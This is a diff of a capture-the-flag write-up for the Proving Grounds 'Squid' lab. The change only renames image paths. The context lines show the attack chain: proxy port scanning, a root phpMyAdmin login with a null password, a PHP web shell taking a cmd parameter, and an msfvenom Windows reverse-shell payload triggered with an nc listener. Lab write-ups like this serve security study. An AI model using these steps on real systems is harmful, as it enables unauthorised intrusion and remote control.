@@ -25,19 +25,19 @@ PORT     STATE SERVICE    VERSION
 
 Squid http proxy service running on PORT 3128. Use [Squid Pivoting Open Port Scanner](https://github.com/aancw/spose) to perform PORT scanning.
 
-![img](/assets/images/CTF/Pg-Play/Squid/pscan.png)
+![img](/assets/images/CTF/Proving_Grounds/Squid/pscan.png)
 
 Configure the proxy `server IP` and `PORT` in the browser to access the webserver running on PORT 8080.
 
-![img](/assets/images/CTF/Pg-Play/Squid/8080.png)
+![img](/assets/images/CTF/Proving_Grounds/Squid/8080.png)
 
 **System Information**
 
-![img](/assets/images/CTF/Pg-Play/Squid/sysinfo.png)
+![img](/assets/images/CTF/Proving_Grounds/Squid/sysinfo.png)
 
 **PHPMyadmin**
 
-![img](/assets/images/CTF/Pg-Play/Squid/myadmin.png)
+![img](/assets/images/CTF/Proving_Grounds/Squid/myadmin.png)
 
 Login with username `root` and password as `null`.
 
@@ -55,7 +55,7 @@ As shown in the phpinfo() page the document root folder is `C:/wamp/www`. So the
 http://192.168.237.189:8080/shell2.php?cmd=whoami
 ```
 
-![img](/assets/images/CTF/Pg-Play/Squid/if.png)
+![img](/assets/images/CTF/Proving_Grounds/Squid/if.png)
 
 ## Obtain Stable Shell using msfvenom
 
@@ -65,7 +65,7 @@ msfvenom -f exe -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=1234 -o mshell
 
 Use curl to download the shell in to the attacking machine. Run a `nc` llisterner and execute the reverse shell by visiting `http://192.168.237.189:8080/shell2.php?cmd=mshell.exe`
 
-![img](/assets/images/CTF/Pg-Play/Squid/rshell.png)
+![img](/assets/images/CTF/Proving_Grounds/Squid/rshell.png)
 
 Reverse shell obtained.
 
